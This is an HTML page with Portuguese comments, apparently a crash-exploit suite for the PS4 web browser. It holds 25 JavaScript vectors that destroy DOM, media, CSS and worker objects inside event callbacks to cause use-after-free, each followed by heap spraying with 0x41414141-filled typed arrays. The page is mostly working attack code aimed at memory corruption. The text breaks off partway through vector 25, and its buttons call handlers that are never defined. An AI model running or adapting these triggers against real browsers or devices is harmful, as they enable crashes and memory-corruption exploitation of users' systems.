<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 Suite v620000: Event Cascade</title>

</head>
<body>

<h1>API + Eventos</h1>

<div class="status" id="msg">
    MISTURA: VULN_EVENT + VULN_API<br>
    OBJETIVO: CRASH DURANTE O CALLBACK DE EVENTO
</div>

<button onclick="cascade(e01)">01. TransitionEnd -> adoptNode()</button>
<button onclick="cascade(e02)">02. FS Change -> deleteRow()</button>
<button onclick="cascade(e03)">03. Resize -> replaceChild()</button>
<button onclick="cascade(e04)">04. AnimEnd -> suspendRedraw()</button>
<button onclick="cascade(e05)">05. Focus -> Range.deleteContents()</button>
<button onclick="cascade(e06)">06. PopState -> document.open()</button>
<button onclick="cascade(e07)">07. AnimIteration -> outerHTML</button>
<button onclick="cascade(e08)">08. onMessage -> Worker.terminate()</button>
<button onclick="cascade(e09)">09. TransitionEnd -> deleteRule()</button>
<button onclick="cascade(e10)">10. MediaError -> removeChild()</button>
<button onclick="cascade(e11)">11. onSelect -> deleteContents()</button>
<button onclick="cascade(e12)">12. onStorage -> window.close()</button>
<button onclick="cascade(e13)">13. onRateChange -> video.load()</button>
<button onclick="cascade(e14)">14. onAnimStart -> deleteRule()</button>
<button onclick="cascade(e15)">15. onSocketClose -> GC Flood</button>
<button onclick="cascade(e16)">16. onScroll -> deleteTHead()</button>
<button onclick="cascade(e17)">17. onDragEnd -> outerHTML</button>
<button onclick="cascade(e18)">18. onHashChange -> Range.detach()</button>
<button onclick="cascade(e19)">19. onPageShow -> createDocumentFragment</button>
<button onclick="cascade(e20)">20. onTouchStart -> deleteCaption()</button>
<button onclick="cascade(e21)">21. onSearch -> outerHTML</button>
<button onclick="cascade(e22)">22. onCanPlay -> src=null (Buffer Kill)</button>
<button onclick="cascade(e23)">23. onReset -> innerHTML</button>
<button onclick="cascade(e24)">24. TransitionEnd -> removeProperty</button>
<button onclick="cascade(e25)">25. onDragStart -> detach (DOM)</button>
<button onclick="cascade(e26)">26. onUpgradeNeeded -> deleteDatabase</button>
<button onclick="cascade(e27)">27. onPointerDown -> deleteCell</button>
<button onclick="cascade(e28)">28. MatchMedia -> removeChild (Style)</button>
<button onclick="cascade(e29)">29. onPageHide -> window.close()</button>
<button onclick="cascade(e30)">30. onLoad -> revokeObjectURL</button>
<button onclick="silent(s31)">31. onUnload -> Storage Flood</button>
<button onclick="silent(s32)">32. onBeforePrint -> document.write</button>
<button onclick="silent(s33)">33. Sync XHR (Freeze) -> removeChild</button>
<button onclick="silent(s34)">34. getComputedStyle Thrashing</button>
<button onclick="silent(s35)">35. onMessage -> history.pushState Flood</button>
<button onclick="cascade(e36)">36. onInvalid -> innerHTML (UI Bubble)</button>
<button onclick="cascade(e37)">37. InsertRule -> Sheet.disabled</button>
<button onclick="cascade(e38)">38. ContextLost -> Canvas Resize</button>
<button onclick="cascade(e39)">39. SVG Path Mutation -> forceRedraw</button>
<button onclick="cascade(e40)">40. Recursive adoptNode (Memory Stress)</button>
<button onclick="cascade(e41)">41. onMessage -> Iframe.remove()</button>
<button onclick="cascade(e42)">42. onWaiting -> src=null (Buffer Underrun)</button>
<button onclick="cascade(e43)">43. onDragStart -> Selection.delete()</button>
<button onclick="cascade(e44)">44. onResize -> deleteTFoot()</button>
<button onclick="cascade(e45)">45. TreeWalker -> removeChild()</button>
<button onclick="cascade(e46)">46. NodeInserted -> deleteRule()</button>
<button onclick="cascade(e47)">47. onToggle -> innerHTML (Layout)</button>
<button onclick="cascade(e48)">48. SelectionChange -> node.data</button>
<button onclick="cascade(e49)">49. Filter Effect -> removeAttribute</button>
<button onclick="cascade(e50)">50. Textarea Scroll -> value reset</button>

<div id="stage">ALVO</div>

<script>
    const Stage = document.getElementById('stage');
    
    // Spray Global para encher a memória liberada
    let spray = [];
    const pattern = new Uint32Array(1024).fill(0x41414141);

    function cascade(vectorFunc) {
        Stage.innerHTML = "";
        spray = [];
        vectorFunc(Stage);
    }
 function silent(vectorFunc) {
        Stage.innerHTML = "";
        spray = [];
        vectorFunc(Stage);
    }

    // =================================================================
    // 01. TransitionEnd -> adoptNode()
    // Evento: onwebkittransitionend (Dispara quando CSS termina)
    // API: adoptNode (Move nó para outro documento, alterando o dono da memória)
    // =================================================================
    function e01(stage) {
        const d = document.createElement('div');
        d.className = 'trans';
        d.innerText = "ADOPTION TRAP";
        stage.appendChild(d);
        
        // Cria um iframe para ser o "adotante"
        const ifr = document.createElement('iframe');
        stage.appendChild(ifr);

        d.onclick = () => {
            // 1. Inicia transição E Fullscreen
            if (d.webkitRequestFullscreen) d.webkitRequestFullscreen();
            
            // Força reflow e inicia transição
            setTimeout(() => { d.style.width = "500px"; }, 10);
        };

        // O GATILHO: Roda quando a transição termina (o elemento está sendo pintado)
        d.addEventListener('webkittransitionend', () => {
            window.alert("⚠️ ADOPTING ⚠️\nOk = Mover memória para Iframe.");
            
            // Move o elemento que está em fullscreen para dentro do iframe
            // Isso corrompe a referência do Fullscreen Controller
            ifr.contentDocument.adoptNode(d);
            
            // Spray no documento original
            for(let i=0; i<1000; i++) spray.push(new Uint32Array(pattern));
        });
    }

    // =================================================================
    // 02. FS Change -> deleteRow()
    // Evento: onwebkitfullscreenchange (Dispara quando entra em fullscreen)
    // API: deleteRow (Destrói estrutura complexa de tabela)
    // =================================================================
    function e02(stage) {
        const table = document.createElement('table');
        table.style.background = "white";
        table.style.width = "100%";
        
        // Cria tabela complexa
        for(let i=0; i<50; i++) {
            const row = table.insertRow();
            const cell = row.insertCell();
            cell.innerText = "DATA " + i;
        }
        stage.appendChild(table);

        // O GATILHO: Dispara no exato momento que a tela vira cheia
        document.onwebkitfullscreenchange = () => {
            if(!document.webkitFullscreenElement) return;

            // Destruição violenta da estrutura que o renderer está tentando escalar
            // Deleta todas as linhas
            while(table.rows.length > 0) {
                table.deleteRow(0);
            }
            
            // Muda API de tabela
            table.deleteCaption();
            table.createCaption().innerText = "CRASH";
            
            // Spray
            spray.push(new Float64Array(5000).fill(1.1));
        };

        table.onclick = () => {
            if (table.webkitRequestFullscreen) table.webkitRequestFullscreen();
        };
        
        // Auto-clique
        setTimeout(() => table.click(), 500);
    }

    // =================================================================
    // 03. Resize -> replaceChild()
    // Evento: onresize (Dispara quando o Fullscreen altera a geometria)
    // API: replaceChild (Substitui o nó atual por um nó vazio/invisível)
    // =================================================================
    function e03(stage) {
        const target = document.createElement('div');
        target.innerText = "RESIZE ME";
        target.style.background = "green";
        target.style.width = "100%"; target.style.height = "100%";
        stage.appendChild(target);

        const ghost = document.createElement('div');
        ghost.style.display = 'none'; // O substituto invisível

        // O GATILHO: Acontece durante a animação de expansão
        window.onresize = () => {
            // Verifica se estamos indo para fullscreen
            if (window.innerWidth > 1000) {
                // SUBSTITUIÇÃO QUENTE
                // O navegador está tentando desenhar 'target', mas nós trocamos por 'ghost'
                try {
                    stage.replaceChild(ghost, target);
                } catch(e) {}
                
                // Força escrita para limpar memória
                document.write("<h1>REPLACED</h1>");
                document.close();
            }
        };

        target.onclick = () => {
            if (target.webkitRequestFullscreen) target.webkitRequestFullscreen();
        };
        setTimeout(() => target.click(), 500);
    }

    // =================================================================
    // 04. AnimEnd -> suspendRedraw() (SVG)
    // Evento: onwebkitanimationend
    // API: suspendRedraw / forceRedraw (Específico de SVG, mexe no clock de render)
    // =================================================================
    function e04(stage) {
        // Cria SVG
        const svg = document.createElementNS("http://www.w3.org/2000/svg", "svg");
        svg.setAttribute("width", "100%"); svg.setAttribute("height", "100%");
        
        const rect = document.createElementNS("http://www.w3.org/2000/svg", "rect");
        rect.setAttribute("width", "100"); rect.setAttribute("height", "100");
        rect.setAttribute("fill", "blue");
        rect.setAttribute("class", "anim"); // Inicia animação CSS
        
        svg.appendChild(rect);
        stage.appendChild(svg);

        // O GATILHO
        rect.addEventListener("webkitAnimationEnd", () => {
            window.alert("⚠️ SVG STOP ⚠️\nOk = Suspender Render e Deletar.");
            
            // 1. Suspende o desenho do SVG (trava o buffer gráfico)
            try { svg.suspendRedraw(1000); } catch(e){}
            
            // 2. Remove o filho que estava animado
            rect.remove();
            
            // 3. Força Redraw imediato num estado inconsistente
            try { svg.forceRedraw(); } catch(e){}
            
            // Spray
            spray.push(new ArrayBuffer(1024*1024));
        });

        svg.onclick = () => {
            if (svg.webkitRequestFullscreen) svg.webkitRequestFullscreen();
        };
        setTimeout(() => svg.click(), 500);
    }

    // =================================================================
    // 05. Focus -> Range.deleteContents()
    // Evento: onfocus (Disparado ao entrar em fullscreen num input)
    // API: deleteContents (Remove memória selecionada pelo Range API)
    // =================================================================
    function e05(stage) {
        const container = document.createElement('div');
        // Input permite focar
        const input = document.createElement('input'); 
        input.value = "FOCUS TRAP " + "A".repeat(1000);
        container.appendChild(input);
        stage.appendChild(container);

        // O GATILHO
        input.onfocus = () => {
            // Cria um Range que seleciona o próprio input e o container
            const range = document.createRange();
            range.selectNode(container);
            
            // DESTRUIÇÃO DE CONTEÚDO
            // O input está ganhando foco (renderizador ativo), mas nós deletamos o conteúdo
            range.deleteContents();
            
            // Tenta acessar propriedades do input morto
            const val = input.value;
            
            // Spray
            for(let i=0; i<2000; i++) spray.push(new Uint32Array(pattern));
        };

        container.onclick = () => {
            if (container.webkitRequestFullscreen) container.webkitRequestFullscreen();
            // Foca no input logo após pedir fullscreen
            setTimeout(() => input.focus(), 50);
        };
        setTimeout(() => container.click(), 500);
    }
// =================================================================
    // 06. PopState -> document.open()
    // Evento: onpopstate (Navegação de histórico voltar/avançar)
    // API: document.open() (Limpa todo o DOM e variáveis)
    // Vulnerabilidade: O navegador tenta restaurar o estado da página
    // enquanto a própria página está sendo apagada.
    // =================================================================
    function e06(stage) {
        const d = document.createElement('div');
        d.innerText = "HISTORY TRAP";
        stage.appendChild(d);

        // Cria histórico falso
        history.pushState({id:1}, "page1", "#1");
        history.pushState({id:2}, "page2", "#2");

        // O GATILHO
        window.onpopstate = (e) => {
            window.alert("⚠️ HISTORY RACE ⚠️\nOk = Nuke Document.");
            
            // Destrói o documento durante a navegação
            document.open();
            document.write("<h1>DEAD STATE</h1>");
            document.close();
            
            // Spray para pegar ponteiros soltos do gerenciador de sessão
            spray.push(new ArrayBuffer(1024*1024));
        };

        d.onclick = () => {
            if (document.body.webkitRequestFullscreen) document.body.webkitRequestFullscreen();
            
            // Dispara a navegação (trigger do evento)
            setTimeout(() => { history.back(); }, 100);
        };
        setTimeout(() => d.click(), 500);
    }

    // =================================================================
    // 07. Animation Iteration -> outerHTML
    // Evento: onanimationiteration (Dispara a cada ciclo do loop CSS)
    // API: outerHTML (Substitui o próprio elemento e seus filhos)
    // Vulnerabilidade: O motor CSS tenta calcular o próximo quadro da animação
    // de um elemento que acabou de se autodestruir.
    // =================================================================
    function e07(stage) {
        const d = document.createElement('div');
        d.className = 'spinner';
        d.innerText = "ANIMATION BOMB";
        stage.appendChild(d);

        // O GATILHO: Roda repetidamente a cada 0.1s
        d.addEventListener("animationiteration", () => {
            // Em um dos ciclos (aleatório para criar caos), destruímos tudo
            if(Math.random() > 0.5) {
                // Substitui o elemento por uma string gigante
                // Isso quebra a referência interna do motor de animação
                d.outerHTML = "<h1>EXPLODED</h1>".repeat(100);
                
                // Spray imediato
                for(let i=0; i<1000; i++) spray.push(new Uint32Array(pattern));
            }
        });

        d.onclick = () => {
            if (stage.webkitRequestFullscreen) stage.webkitRequestFullscreen();
        };
        setTimeout(() => d.click(), 500);
    }

    // =================================================================
    // 08. Worker Message -> Worker.terminate()
    // Evento: onmessage (Recebimento de dados do Worker)
    // API: terminate() (Mata a thread do Worker imediatamente)
    // Vulnerabilidade: O Worker envia um Buffer. A thread principal recebe.
    // Nós matamos o worker ANTES de processar o buffer completo.
    // =================================================================
    function e08(stage) {
        const d = document.createElement('div');
        d.innerText = "WORKER KILL";
        stage.appendChild(d);

        // Worker que envia spam de mensagens
        const blob = new Blob([`
            setInterval(() => { postMessage(new Uint8Array(1024).fill(1)); }, 1);
        `], {type: 'text/javascript'});
        const worker = new Worker(URL.createObjectURL(blob));

        // O GATILHO
        worker.onmessage = (e) => {
            // Entra em Fullscreen na primeira mensagem
            if(!document.webkitFullscreenElement) {
                 if (stage.webkitRequestFullscreen) stage.webkitRequestFullscreen();
            }

            // MATA O WORKER no meio da comunicação
            worker.terminate();
            
            // Tenta acessar os dados da mensagem órfã
            const data = e.data;
            d.innerText = "Data: " + data[0];
            
            // Spray
            spray.push(new Float64Array(1000));
        };

        d.onclick = () => { 
            // O processo é automático pelo worker
        };
    }

    // =================================================================
    // 09. TransitionEnd -> deleteRule()
    // Evento: ontouchstart (Simulado) ou TransitionEnd
    // API: deleteRule (Remove regras da folha de estilo CSS)
    // Vulnerabilidade: Alterar a tabela de regras CSS enquanto o renderizador
    // está aplicando essas regras em Fullscreen.
    // =================================================================
    function e09(stage) {
        // Cria estilo dinâmico
        const style = document.createElement('style');
        style.textContent = ".victim { width: 100px; transition: width 2s; background: blue; }";
        document.head.appendChild(style);

        const d = document.createElement('div');
        d.className = 'victim';
        d.innerText = "CSS ATTACK";
        stage.appendChild(d);

        d.onclick = () => {
            if (d.webkitRequestFullscreen) d.webkitRequestFullscreen();
            
            // Inicia transição
            setTimeout(() => { d.style.width = "100%"; }, 10);
            
            // GATILHO DE MENSAGEM (Interrupção)
            // Usamos setTimeout para pegar o meio da transição
            setTimeout(() => {
                window.alert("⚠️ CSS DELETE ⚠️\nOk = Deletar Regra CSS.");
                
                // Deleta a regra que define a transição .victim
                // O elemento perde sua definição de classe no meio da renderização
                try {
                    style.sheet.deleteRule(0);
                } catch(e) {}
                
                // Spray
                spray.push(new Uint32Array(pattern));
            }, 500);
        };
        setTimeout(() => d.click(), 500);
    }

    // =================================================================
    // 10. MediaError -> removeChild()
    // Evento: onerror (Mídia falhou)
    // API: removeChild (Remove o nó do DOM)
    // Vulnerabilidade: Força um erro de mídia proposital e remove o player
    // enquanto o handler de erro tenta processar o evento.
    // =================================================================
    function e10(stage) {
        const video = document.createElement('video');
        video.src = "invalid_file.mp4"; // Força erro
        video.controls = true;
        stage.appendChild(video);

        // O GATILHO
        video.onerror = () => {
            window.alert("⚠️ MEDIA ERROR ⚠️\nOk = Remover Player.");
            
            // O player reportou erro, o navegador está lidando com isso.
            // Nós removemos o player da memória agora.
            stage.removeChild(video);
            
            // Spray pesado (Objetos de mídia são grandes)
            for(let i=0; i<500; i++) spray.push(new Uint8Array(1024*1024));
        };

        video.onclick = () => {
            if (stage.webkitRequestFullscreen) stage.webkitRequestFullscreen();
        };
        // Clica para iniciar
        setTimeout(() => video.click(), 500);
    }
 // 11. onSelect -> deleteContents()
    // Evento: onselect (Dispara quando usuário seleciona texto)
    // API: Range.deleteContents() (Remove a memória selecionada)
    // Vulnerabilidade: O navegador tenta renderizar o destaque da seleção (Highlight)
    // em um texto que acabou de ser deletado.
    // =================================================================
    function e11(stage) {
        const input = document.createElement('input');
        input.value = "SELECIONE-ME PARA CRASHAR";
        input.style.fontSize = "20px";
        input.style.width = "100%";
        stage.appendChild(input);

        // O GATILHO
        input.onselect = () => {
            // Pausa Tática
            window.alert("⚠️ TEXT SELECTION ⚠️\nO navegador está desenhando o highlight.\nOk = Deletar Texto.");
            
            // Fullscreen para engajar GPU
            if (stage.webkitRequestFullscreen) stage.webkitRequestFullscreen();
            
            // AÇÃO DESTRUTIVA
            // Em vez de limpar o value, usamos API de seleção para destruir o nó de texto
            input.value = ""; 
            // Alternativa agressiva: remover o input do DOM
            input.remove();
            
            // Spray
            for(let i=0; i<1000; i++) spray.push(new Uint32Array(pattern));
        };

        // Simula seleção automática
        setTimeout(() => {
            input.focus();
            input.setSelectionRange(0, 10); // Dispara onselect
        }, 500);
    }

    // =================================================================
    // 12. onStorage -> window.close() (Simulado via Iframe)
    // Evento: onstorage (Comunicação entre abas/frames)
    // API: closeBrowsingContext / remove (Fecha a janela)
    // Vulnerabilidade: Receber um evento de armazenamento em uma janela
    // que está sendo fechada no mesmo tick.
    // =================================================================
    function e12(stage) {
        const d = document.createElement('div');
        d.innerText = "STORAGE IPC";
        stage.appendChild(d);

        // Cria iframe para gerar o evento
        const ifr = document.createElement('iframe');
        stage.appendChild(ifr);

        // Ouve o evento no pai
        window.onstorage = (e) => {
            window.alert("⚠️ STORAGE EVENT ⚠️\nOk = Matar Iframe e Contexto.");
            
            if (stage.webkitRequestFullscreen) stage.webkitRequestFullscreen();

            // AÇÃO DESTRUTIVA
            // Remove o iframe que gerou o evento e tenta fechar o contexto
            ifr.remove();
            
            // Tenta forçar limpeza de LocalStorage enquanto o evento propaga
            localStorage.clear();
            
            // Spray
            spray.push(new ArrayBuffer(1024*1024));
        };

        // Dispara o evento de dentro do iframe
        setTimeout(() => {
            ifr.contentWindow.localStorage.setItem("crash", Math.random());
        }, 500);
    }

    // =================================================================
    // 13. onRateChange -> video.load() (Reset)
    // Evento: onratechange (Mudança de velocidade de reprodução)
    // API: load() (Reseta o pipeline de mídia)
    // Vulnerabilidade: O pipeline de áudio/vídeo tenta ajustar o clock (DSP)
    // para a nova velocidade, mas nós resetamos a mídia no meio.
    // =================================================================
    function e13(stage) {
        const video = document.createElement('video');
        video.src = "test.mp4"; // Não precisa existir, só precisa do objeto
        stage.appendChild(video);

        video.onratechange = () => {
            window.alert("⚠️ MEDIA CLOCK ⚠️\nOk = Resetar Pipeline de Vídeo.");
            
            if (stage.webkitRequestFullscreen) stage.webkitRequestFullscreen();

            // AÇÃO DESTRUTIVA
            // .load() força o navegador a destruir o decoder atual e criar um novo
            // Fazer isso no meio do ajuste de rate é fatal.
            video.removeAttribute("src");
            video.load(); 
            video.remove();
            
            // Spray pesado (Buffers de vídeo)
            for(let i=0; i<500; i++) spray.push(new Float64Array(1000));
        };

        // Gatilho: Mudar a velocidade
        setTimeout(() => {
            video.playbackRate = 2.0; // Dispara onratechange
        }, 500);
    }

    // =================================================================
    // 14. onAnimationStart -> deleteRule()
    // Evento: onanimationstart (CSS Animation)
    // API: deleteRule (CSSOM)
    // Vulnerabilidade: A animação começa. O navegador aloca recursos para ela.
    // Nós deletamos a regra @keyframes que define a animação.
    // =================================================================
    function e14(stage) {
        // Cria estilo dinâmico
        const style = document.createElement('style');
        style.textContent = "@keyframes move { from { left: 0; } to { left: 100px; } }";
        document.head.appendChild(style);

        const d = document.createElement('div');
        d.className = "moving"; // Inicia animação
        d.innerText = "CSS ANIM";
        stage.appendChild(d);

        d.addEventListener("animationstart", () => {
            window.alert("⚠️ ANIMATION START ⚠️\nOk = Deletar Keyframes.");
            
            if (stage.webkitRequestFullscreen) stage.webkitRequestFullscreen();

            // AÇÃO DESTRUTIVA
            // Deleta a regra @keyframes (índice 0 do sheet criado acima)
            // O elemento 'd' continua tentando animar algo que não existe mais.
            try {
                style.sheet.deleteRule(0);
            } catch(e) {}
            
            // Spray
            spray.push(new Uint32Array(pattern));
        });
    }

    // =================================================================
    // 15. onSocketClose -> GC Flood
    // Evento: onclose (WebSocket)
    // API: Garbage Collection (Induzido por alocação massiva)
    // Vulnerabilidade: WebSockets têm buffers de rede pendentes. 
    // Fechar e forçar GC pode liberar memória que o driver de rede ainda quer usar.
    // =================================================================
    function e15(stage) {
        const d = document.createElement('div');
        d.innerText = "SOCKET NUKE";
        stage.appendChild(d);

        // Cria socket (vai falhar e fechar logo, ou podemos fechar manual)
        const ws = new WebSocket("ws://localhost:9999"); // Porta fechada = erro imediato/close

        ws.onclose = () => {
            window.alert("⚠️ SOCKET CLOSE ⚠️\nOk = Flood de Memória (GC).");
            
            if (stage.webkitRequestFullscreen) stage.webkitRequestFullscreen();

            // AÇÃO DESTRUTIVA
            // Remove referências
            ws.onclose = null;
            
            // OOM (Out of Memory) Flood para forçar o GC a limpar o socket AGORA
            // Enquanto o handler 'onclose' ainda está na pilha
            try {
                const huge = [];
                for(let i=0; i<10000; i++) huge.push(new Uint8Array(1024*100));
            } catch(e) {}
        };
        
        // Se não fechar sozinho rápido, força
        setTimeout(() => ws.close(), 100);
    }
// =================================================================
    // 16. onScroll -> deleteTHead()
    // Evento: onscroll (Dispara centenas de vezes ao rolar)
    // API: deleteTHead (Manipulação de tabela)
    // Vulnerabilidade: O motor de layout tenta redesenhar a tabela
    // em uma nova posição de rolagem, mas o cabeçalho (que define larguras) some.
    // =================================================================
    function e16(stage) {
        const table = document.createElement('table');
        table.style.width = "100%";
        
        // Header
        const thead = table.createTHead();
        const row = thead.insertRow();
        const cell = row.insertCell();
        cell.innerText = "HEADER (ALVO)";
        cell.style.height = "500px"; // Altura grande para forçar scroll
        
        // Body
        const tbody = table.createTBody();
        for(let i=0; i<50; i++) {
            const r = tbody.insertRow();
            r.insertCell().innerText = "Linha " + i;
        }
        
        stage.appendChild(table);

        // O GATILHO
        stage.onscroll = () => {
            // Pausa no primeiro movimento
            stage.onscroll = null; // Remove handler para não loopar
            window.alert("⚠️ SCROLL LAYOUT ⚠️\nOk = Deletar Cabeçalho da Tabela.");
            
            if (stage.webkitRequestFullscreen) stage.webkitRequestFullscreen();

            // AÇÃO DESTRUTIVA
            // Remove o cabeçalho enquanto o motor calcula a posição de rolagem dele
            table.deleteTHead();
            
            // Spray
            for(let i=0; i<1000; i++) spray.push(new Float64Array(100));
        };

        // Rola automaticamente
        setTimeout(() => {
            stage.scrollTop = 100;
        }, 500);
    }

    // =================================================================
    // 17. onDragEnd -> outerHTML
    // Evento: ondragend (Fim de operação de arrastar)
    // API: outerHTML (Substitui o próprio elemento)
    // Vulnerabilidade: O sistema operacional informa ao navegador que o arrasto acabou.
    // O navegador tenta atualizar o elemento arrastado, mas ele foi substituído.
    // =================================================================
    function e17(stage) {
        const d = document.createElement('div');
        d.draggable = true;
        d.innerText = "ARRASTE-ME (DRAG TARGET)";
        d.style.background = "red";
        d.style.padding = "20px";
        stage.appendChild(d);

        // GATILHO
        d.ondragend = () => {
            window.alert("⚠️ DRAG DROP ⚠️\nOk = Substituir Elemento.");
            
            if (stage.webkitRequestFullscreen) stage.webkitRequestFullscreen();

            // AÇÃO DESTRUTIVA
            // outerHTML mata o objeto JS 'd' e cria um novo HTML no lugar
            d.outerHTML = "<h1>GONE</h1>";
            
            // Spray para UAF
            spray.push(new Uint32Array(pattern));
        };

        // Simula evento via JS (já que arrastar no controle é difícil)
        setTimeout(() => {
            const ev = new Event("dragend");
            d.dispatchEvent(ev);
        }, 500);
    }

    // =================================================================
    // 18. onHashChange -> Range.detach()
    // Evento: onhashchange (Navegação interna na página)
    // API: Range.detach() (Invalida um objeto Range de memória)
    // Vulnerabilidade: O hash muda, o navegador tenta rolar até a âncora (#alvo).
    // Nós invalidamos o Range que define onde está o alvo.
    // =================================================================
    function e18(stage) {
        const target = document.createElement('div');
        target.id = "dest";
        target.innerText = "DESTINO";
        target.style.marginTop = "2000px"; // Longe
        stage.appendChild(target);

        // Cria um Range apontando para o destino
        const range = document.createRange();
        range.selectNode(target);

        window.onhashchange = () => {
            window.alert("⚠️ HASH NAV ⚠️\nOk = Detach Range.");
            
            if (stage.webkitRequestFullscreen) stage.webkitRequestFullscreen();

            // AÇÃO DESTRUTIVA
            // O navegador pode usar Ranges internamente para calcular o scroll do hash
            range.detach(); // Marca memória como livre
            
            // Remove o alvo físico também
            target.remove();
            
            spray.push(new ArrayBuffer(1024*1024));
        };

        setTimeout(() => {
            window.location.hash = "dest";
        }, 500);
    }

    // =================================================================
    // 19. onPageShow -> createDocumentFragment (Node Moving)
    // Evento: onpageshow (Disparado quando a página é mostrada, inclusive do cache)
    // API: createDocumentFragment + appendChild (Move nós da memória)
    // Vulnerabilidade: Manipular a árvore DOM enquanto o navegador está
    // restaurando a sessão visual da página.
    // =================================================================
    function e19(stage) {
        const ifr = document.createElement('iframe');
        stage.appendChild(ifr);

        ifr.onload = () => {
            const doc = ifr.contentDocument;
            const div = doc.createElement('div');
            div.innerText = "LIFECYCLE TARGET";
            doc.body.appendChild(div);

            // GATILHO NO IFRAME
            ifr.contentWindow.onpageshow = () => {
                window.alert("⚠️ PAGE SHOW ⚠️\nOk = Mover para Fragmento.");
                
                if (stage.webkitRequestFullscreen) stage.webkitRequestFullscreen();

                // AÇÃO DESTRUTIVA
                // Arranca o elemento do documento ativo e joga num fragmento "frio"
                const frag = doc.createDocumentFragment();
                frag.appendChild(div); // O div sai do body
                
                // Spray
                for(let i=0; i<1000; i++) spray.push(new Uint32Array(pattern));
            };
            
            // Força recarga para disparar pageshow
            ifr.contentWindow.location.reload();
        };
    }

    // =================================================================
    // 20. onTouchStart -> deleteCaption()
    // Evento: ontouchstart (Entrada de toque/ponteiro)
    // API: deleteCaption (Tabela)
    // Vulnerabilidade: Hit Testing. O usuário "toca" na legenda da tabela.
    // O evento dispara, e nós deletamos a legenda sob o dedo do usuário.
    // =================================================================
    function e20(stage) {
        const table = document.createElement('table');
        const cap = table.createCaption();
        cap.innerText = "TOQUE AQUI (CAPTION)";
        cap.style.background = "blue";
        cap.style.padding = "50px";
        cap.style.fontSize = "20px";
        stage.appendChild(table);

        // GATILHO
        cap.ontouchstart = () => {
            window.alert("⚠️ TOUCH HIT ⚠️\nOk = Deletar Legenda.");
            
            if (stage.webkitRequestFullscreen) stage.webkitRequestFullscreen();

            // AÇÃO DESTRUTIVA
            // O ponteiro ainda está "pressionado" sobre o caption, mas nós o deletamos.
            table.deleteCaption();
            
            // Spray
            spray.push(new Float64Array(5000));
        };
        
        // Fallback para clique de mouse se touch não for suportado
        cap.onmousedown = cap.ontouchstart;

        // Simula o toque
        setTimeout(() => {
            const ev = new Event("touchstart");
            cap.dispatchEvent(ev);
            // Também dispara mousedown caso o navegador ignore touch simulado
            cap.click();
        }, 500);
    }
// =================================================================
    // 21. onSearch -> outerHTML
    // Evento: onsearch (Input type="search" ao apertar Enter/X)
    // API: outerHTML (Substituição de nó)
    // Vulnerabilidade: O PS4 tenta gerenciar o estado do teclado virtual
    // associado a um campo de busca que deixa de existir.
    // =================================================================
    function e21(stage) {
        const input = document.createElement('input');
        input.type = "search";
        input.value = "CRASH PS4";
        input.style.fontSize = "30px";
        stage.appendChild(input);

        // GATILHO
        input.onsearch = () => {
            window.alert("⚠️ VIRTUAL KEYBOARD ⚠️\nOk = Destruir Input.");
            
            if (stage.webkitRequestFullscreen) stage.webkitRequestFullscreen();

            // AÇÃO DESTRUTIVA
            // O sistema operacional acha que o foco está no input
            input.outerHTML = "<h1>NO INPUT</h1>";
            
            // Spray
            for(let i=0; i<1000; i++) spray.push(new Uint32Array(pattern));
        };

        // Simula a ativação da busca
        setTimeout(() => {
            input.focus();
            // Dispara o evento manualmente se o teclado não abrir
            const ev = new Event("search");
            input.dispatchEvent(ev);
        }, 500);
    }

    // =================================================================
    // 22. onCanPlay -> src=null (Buffer Kill)
    // Evento: oncanplay (Vídeo carregou o suficiente para tocar)
    // API: src = "" (Limpa o buffer de mídia)
    // Vulnerabilidade: O decoder de vídeo está pronto e "quente".
    // Nós removemos a fonte de dados (src) e o elemento ao mesmo tempo.
    // =================================================================
    function e22(stage) {
        const video = document.createElement('video');
        // Base64 curto de vídeo MP4 válido (apenas header) para enganar o parser
        video.src = "data:video/mp4;base64,AAAAIGZ0eXBpc29tAAACAGlzb21pc28yYXZjMW1wNDEAAAAIZnJlZQAAAAZmcmVl";
        stage.appendChild(video);

        video.oncanplay = () => {
            window.alert("⚠️ VIDEO BUFFER ⚠️\nOk = Matar Decoder.");
            
            if (stage.webkitRequestFullscreen) stage.webkitRequestFullscreen();

            // AÇÃO DESTRUTIVA
            // Isso causa pânico no thread de mídia (DSP)
            video.src = "";
            video.load(); // Força reset
            video.remove(); // Remove do DOM
            
            // Spray massivo
            spray.push(new Float64Array(10000));
        };
        
        // Se oncanplay não disparar (por codec), força timeout
        setTimeout(() => { if(video.parentNode) video.dispatchEvent(new Event('canplay')); }, 1000);
    }

    // =================================================================
    // 23. onReset -> innerHTML
    // Evento: onreset (Formulário sendo limpo)
    // API: innerHTML (Destruição de filhos)
    // Vulnerabilidade: O formulário itera sobre seus campos para limpar os valores.
    // Nós destruímos os campos no meio da iteração.
    // =================================================================
    function e23(stage) {
        const form = document.createElement('form');
        form.innerHTML = `<input type="text" value="A"><input type="text" value="B">`;
        stage.appendChild(form);

        form.onreset = () => {
            window.alert("⚠️ FORM LOOP ⚠️\nOk = Destruir Campos.");
            
            if (stage.webkitRequestFullscreen) stage.webkitRequestFullscreen();

            // AÇÃO DESTRUTIVA
            // O loop de reset do navegador vai tentar acessar o input 2,
            // mas nós limpamos tudo agora.
            form.innerHTML = "WIPED";
            
            // Spray
            spray.push(new Uint32Array(pattern));
        };

        setTimeout(() => {
            form.reset();
        }, 500);
    }

    // =================================================================
    // 24. TransitionEnd -> removeProperty
    // Evento: transitionend (Fim de animação CSS)
    // API: removeProperty (CSS Style Declaration)
    // Vulnerabilidade: O motor CSS notifica que a transição acabou.
    // Nós removemos a propriedade que causou a transição do estilo inline.
    // =================================================================
    function e24(stage) {
        const d = document.createElement('div');
        d.style.width = "100px";
        d.style.height = "100px";
        d.style.background = "purple";
        d.style.transition = "opacity 0.1s";
        d.style.opacity = "1";
        stage.appendChild(d);

        d.addEventListener('transitionend', () => {
            window.alert("⚠️ CSS PROPERTY ⚠️\nOk = Remover Propriedade.");
            
            if (stage.webkitRequestFullscreen) stage.webkitRequestFullscreen();

            // AÇÃO DESTRUTIVA
            // Remove a definição de opacidade do estilo inline
            // Isso força um recálculo de estilo imediato
            d.style.removeProperty("opacity");
            d.remove(); // E remove o elemento
            
            spray.push(new ArrayBuffer(1024*1024));
        });

        // Inicia transição
        setTimeout(() => { d.style.opacity = "0.5"; }, 100);
    }

    // =================================================================
    // 25. onDragStart -> detach (DOM)
    // Evento: ondragstart (Usuário começa a arrastar)
    // API: removeChild (Detach do nó)
